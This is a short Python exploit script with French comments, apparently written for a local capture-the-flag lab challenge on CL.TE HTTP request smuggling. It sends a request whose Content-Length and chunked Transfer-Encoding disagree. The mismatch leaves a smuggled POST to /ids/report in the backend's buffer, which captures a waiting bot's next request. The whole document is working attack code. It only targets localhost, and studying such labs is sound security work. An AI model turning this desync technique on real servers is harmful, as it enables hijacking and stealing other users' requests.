#!/usr/bin/env python3
"""
Exploit pour Challenge 1: CL.TE
Le frontend utilise Content-Length, le backend utilise Transfer-Encoding
"""
import socket
import time

def exploit_cl_te():
    # Payload à smuggler
    smuggled = (
        "POST /ids/report HTTP/1.1\r\n"
        "Host: localhost:8888\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 1500\r\n"
        "\r\n"
        "threat_data="
    )
    
    # Construction de la requête complète
    # Leftfrontend lit Content-Length (tout le body)
    # Le backend lit Transfer-Encoding et s'arrête à "0\r\n\r\n", laissant le reste en buffer
    
    # Body: "0\r\n\r\n" (5 bytes) + smuggled (133 bytes) = 138 bytes total
    body_content = "0\r\n\r\n" + smuggled
    
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: localhost:3000\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Transfer-Encoding: chunked\r\n"
        f"Content-Length: {len(body_content)}\r\n"
        "\r\n" +
        body_content
    )
    
    print("[*] Challenge 1: CL.TE")
    print(f"[*] Taille du payload smugglé: {len(smuggled)} bytes")
    print("[*] Envoi de la requête d'attaque...")
    
    try:
        # Connexion au serveur
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('localhost', 3000))
        s.sendall(payload.encode())
        
        # Lecture de la réponse
        response = s.recv(4096)
        print(f"[+] Réponse reçue: {response.decode(errors='ignore').split(chr(10))[0]}")
        s.close()
        
        print("[*] Attente du bot (5 secondes)...")
        time.sleep(5)
        
        print("[+] Exploit envoyé!")
        print("[*] Vérifiez le dashboard: http://localhost:3000/ids/dashboard")
        
    except Exception as e:
        print(f"[!] Erreur: {e}")

if __name__ == "__main__":
    exploit_cl_te()
